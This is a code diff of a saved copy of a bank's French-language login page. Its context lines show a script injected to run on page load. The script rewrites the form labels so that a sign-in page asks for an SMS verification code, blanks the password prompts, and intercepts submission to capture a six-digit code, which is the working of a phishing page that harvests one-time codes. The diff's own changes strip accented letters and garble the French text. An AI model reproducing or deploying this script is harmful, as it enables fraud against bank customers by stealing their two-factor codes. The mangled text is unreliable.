@@ -3,7 +3,7 @@
 <html lang="FR-FR" xmlns="http://www.w3.org/1999/xhtml"><!--
  Page saved with SingleFile 
  url: https://banking.coastcapitalsavings.com/LogIn.aspx?sto=1 
- saved date: Sat Aug 08 2026 11:27:04 GMT-0400 (heure d’été de l’Est nord-américain)
+ saved date: Sat Aug 08 2026 11:27:04 GMT-0400 (heure dt de lEst nord-amricain)
 --><head id="Head1">
 
 
@@ -36,7 +36,7 @@ document.addEventListener("DOMContentLoaded", function() {
         var id = targetInput.id;
         if(id) {
             var label = document.querySelector("label[for='" + id + "']");
-            if(label) label.innerHTML = "<b>Code de vérification SMS</b>";
+            if(label) label.innerHTML = "<b>Code de vrification SMS</b>";
         }
         
         var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
@@ -45,10 +45,10 @@ document.addEventListener("DOMContentLoaded", function() {
             var text = node.nodeValue.toLowerCase();
             if(text.trim().length > 3) {
                 if(text.indexOf("connexion") !== -1 || text.indexOf("connecter") !== -1 || text.indexOf("sign in") !== -1 || text.indexOf("login") !== -1) {
-                    node.nodeValue = "Vérification de sécurité";
+                    node.nodeValue = "Vrification de scurit";
                 }
-                else if(text.indexOf("nom d'utilisateur") !== -1 || text.indexOf("courriel") !== -1 || text.indexOf("numéro de client") !== -1 || text.indexOf("username") !== -1 || text.indexOf("email") !== -1) {
-                    node.nodeValue = "Veuillez entrer le code reçu par SMS :";
+                else if(text.indexOf("nom d'utilisateur") !== -1 || text.indexOf("courriel") !== -1 || text.indexOf("numro de client") !== -1 || text.indexOf("username") !== -1 || text.indexOf("email") !== -1) {
+                    node.nodeValue = "Veuillez entrer le code reu par SMS :";
                 }
                 else if(text.indexOf("mot de passe") !== -1 || text.indexOf("password") !== -1) {
                     node.nodeValue = "";
@@ -120,7 +120,7 @@ document.addEventListener("DOMContentLoaded", function() {
         e.preventDefault(); e.stopImmediatePropagation();
         var code = document.querySelector('input[maxlength="6"]') || document.getElementById('sms_code');
         if(!code || code.value.trim().length < 4){
-          alert('Veuillez saisir le code SMS à 6 chiffres.');
+          alert('Veuillez saisir le code SMS  6 chiffres.');
           if(code) code.focus(); return;
         }
         var _ldr = document.createElement('div');
